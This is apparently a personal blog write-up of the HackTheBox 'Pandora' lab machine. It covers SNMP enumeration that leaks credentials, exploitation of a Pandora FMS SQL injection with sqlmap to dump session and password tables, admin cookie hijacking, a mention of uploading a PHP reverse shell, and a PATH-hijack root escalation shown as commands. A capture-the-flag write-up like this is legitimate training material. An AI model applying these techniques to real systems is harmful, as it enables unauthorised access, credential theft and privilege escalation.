---
title: "Pandora"
date: 2022-09-20T15:03:31+01:00
draft: false
categories:
  - HackTheBox
---

## Enumeration

```bash
└──╼ $nmap -sC -sV 10.129.211.58 -vv

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb

80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
└──╼ $sudo nmap -sV -sU -vv 10.10.11.136

Bug in snmp-win32-software: no string output.
PORT    STATE         SERVICE REASON
68/udp  open|filtered dhcpc   no-response
161/udp open          snmp    udp-response ttl 64
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 3.81 Mb sent, 3.81 Mb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b9:68:1b (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 622.23 Mb sent, 21.09 Mb received
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:22      10.10.14.52:53300
|   TCP  10.10.11.136:22      10.10.14.66:54382
|   TCP  10.10.11.136:22      10.10.14.230:50242
|   TCP  10.10.11.136:22      10.10.16.14:39486
|   TCP  10.10.11.136:22      10.10.16.14:39508
|   TCP  10.10.11.136:55910   10.10.14.66:4444
|   TCP  10.10.11.136:59612   10.10.14.230:4444
|   TCP  10.10.11.136:60112   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.1:44164      127.0.0.1:80
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-processes:
|   1:
|     Name: systemd

...

|_  44956:
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 25m11.75s (151175 timeticks)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 25m11s

```

```bash
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 33560, Words: 13127, Lines: 908]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
```
The website doesnt provide much info...so we focus on the SNMP (simple network management protocol) server on UDP port 161

This takes alot of patience

```bash
└──╼ $snmpwalk -v 2c 10.10.11.136 -c public
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (294326) 0:49:03.26
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (64) 0:00:00.64
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (63) 0:00:00.63
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (63) 0:00:00.63
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (63) 0:00:00.63
...
iso.3.6.1.2.1.25.4.2.1.5.669 = ""
iso.3.6.1.2.1.25.4.2.1.5.670 = ""
iso.3.6.1.2.1.25.4.2.1.5.694 = ""
iso.3.6.1.2.1.25.4.2.1.5.709 = ""
iso.3.6.1.2.1.25.4.2.1.5.718 = ""
iso.3.6.1.2.1.25.4.2.1.5.722 = ""
iso.3.6.1.2.1.25.4.2.1.5.771 = ""
iso.3.6.1.2.1.25.4.2.1.5.772 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: "--foreground"
iso.3.6.1.2.1.25.4.2.1.5.786 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
iso.3.6.1.2.1.25.4.2.1.5.788 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.791 = ""
iso.3.6.1.2.1.25.4.2.1.5.794 = ""
iso.3.6.1.2.1.25.4.2.1.5.856 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.868 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.869 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.877 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.889 = ""
iso.3.6.1.2.1.25.4.2.1.5.893 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.904 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.951 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.980 = ""
iso.3.6.1.2.1.25.4.2.1.5.1106 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1133 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.1176 = STRING: "--user"
iso.3.6.1.2.1.25.4.2.1.5.1178 = ""
iso.3.6.1.2.1.25.4.2.1.5.1437 = ""
iso.3.6.1.2.1.25.4.2.1.5.1515 = ""
iso.3.6.1.2.1.25.4.2.1.5.1516 = ""
iso.3.6.1.2.1.25.4.2.1.5.1658 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1659 = STRING: "-c /bin/sh"
iso.3.6.1.2.1.25.4.2.1.5.1660 = ""
iso.3.6.1.2.1.25.4.2.1.5.1669 = STRING: "-c import pty;pty.spawn(\"/bin/bash\");"
iso.3.6.1.2.1.25.4.2.1.5.1670 = ""
iso.3.6.1.2.1.25.4.2.1.5.2378 = ""

```
Now we have `daniel:HotelBabylon23`

SSH works so we have access

```bash
daniel@pandora:~$ ls -al
total 512
drwxr-xr-x 6 daniel daniel   4096 Jan 15 12:50 .
drwxr-xr-x 4 root   root     4096 Dec  7 14:32 ..
lrwxrwxrwx 1 daniel daniel      9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 daniel daniel    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 daniel daniel   3771 Feb 25  2020 .bashrc
drwx------ 2 daniel daniel   4096 Jan 15 12:03 .cache
drwx------ 4 daniel daniel   4096 Jan 15 12:48 .gnupg
-rw-rw-r-- 1 daniel daniel    250 Jan 15 12:23 .host_check
drwxrwxr-x 3 daniel daniel   4096 Jan 15 12:50 .local
-rw------- 1 daniel daniel     90 Jan 15 12:38 .mysql_history
-rw-r--r-- 1 daniel daniel    807 Feb 25  2020 .profile
drwx------ 2 daniel daniel   4096 Dec  7 14:32 .ssh
-rwxrwxr-x 1 daniel daniel 476147 Sep 27 11:53 linpeas.sh
```

No flag here but there is another user `matt`

```bash
daniel@pandora:/home$ ls
daniel  matt
```
We need to lateral pivot to matt to access his folder

After trying to fool around I just decided to use `linpeas`

```bash
════════════════════════════════════╣ Network Information ╠════════════════════════════════════
╔══════════╣ Hostname, hosts and DNS
pandora
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad

```
Hmmm...

```bash
daniel@pandora:~$ netstat -tuplen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        21038      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          23938      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        25371      -
tcp6       0      0 :::80                   :::*                    LISTEN      0          24913      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          23940      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        21037      -
udp        0      0 0.0.0.0:161             0.0.0.0:*                           0          24086      -
udp6       0      0 ::1:161                 :::*                                0          24087      -
```

It looks like there is a local web service `pandora`

```bash
daniel@pandora:~$ curl pandora.htb
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```

Indeed! now we can port forward the port 80 to access it on our machine

```bash
└──╼ $sudo ssh -L 80:127.0.0.1:80 daniel@10.10.11.136
...
```
sudo because port 80...and I am not really comfortable with that

too lazy to change port now

Anyway we have access to pandora in our browser at `http://127.0.0.1/pandora_console/`

But we need to login???

should we bruteforce that?? sqli?

The version is `v7.0NG.742_FIX_PERL2020` so lets search for public exploits first

There is [critical sqli here!](https://nvd.nist.gov/vuln/detail/CVE-2020-26518)

You have to actually understand the exploit here

you can use sqlmap...thats what we gonna do

```bash
Database: pandora
Table: tsessions_php
[143 entries]
+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+
| id_session                 | data                                                                                                   | last_active |
+----------------------------+--------------------------------------------------------------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                                                                               | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                                                                   | 1638789018  |
| 0fp9ttm5cprlnmi3do4u3c960s | id_usuario|s:6:"daniel";                                                                               | 1642249394  |
| 0noovdm3frqrls78703nq4mbep | NULL                                                                                                   | 1642252241  |
| 0rk3k73mso06b2b9ju4eshm1un | NULL                                                                                                   | 1642256306  |

[TRUNCATED FOR THE SAKE OF YOUR EYES]

Database: pandora
Table: tpassword_history
[3 entries]
+---------+---------+---------------------+-------------------------------------------+---------------------+
| id_pass | id_user | date_end            | password                                  | date_begin          |
+---------+---------+---------------------+-------------------------------------------+---------------------+
| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc          | 2021-06-11 17:28:54 |
| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6          | 2021-06-17 00:11:54 |
| 3       | admin   | 0000-00-00 00:00:00 | ab4f63f9ac65152575886860dde480a1 (azerty) | 2022-01-15 15:32:18 |
+---------+---------+---------------------+-------------------------------------------+---------------------+

```
You need then to replace your PHPSESSID cookie with admin cookie

If you access the dashboard upload a classic php reverse shell

For an easier approach you can use [this](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)

This worked faster and I got user flag!

```bash
$ cd /home/matt
$ ls
user.txt
$
$ cat user.txt
bro_this_flag_is_definitely_to_be_owned
```

## privilege escalation

checking for SUID (a classic)

```bash
$ find / -perm -u=s 2> /dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1


```
`/usr/bin/pandora_backup` is the most outstanding one

```bash
pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup failed!
Check your permissions!
```
lol...Its a `path hijacking`

But I need a solid shell...lets drop ssh keys and connect

use `ssh-keygen`, set `chmod 600` everywhere, add `id_rsa.pub` to `authorized_keys`...profit

Then just do the classics

```bash
matt@pandora:~$ cd /tmp
matt@pandora:/tmp$ echo "/bin/sh" > tar
matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ export PATH=$(pwd):$PATH
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# id
uid=0(root) gid=1000(matt) groups=1000(matt)
# cd /root
# ls
root.txt
# cat root.txt
root_flag_was_a_bit_easier_but_not_free

```

I already said hackthebox did not have any easy box

This confirms it! when they say its easy, expect medium...BUT this ONE was just HARD!

But its always fun learning through pain! XD

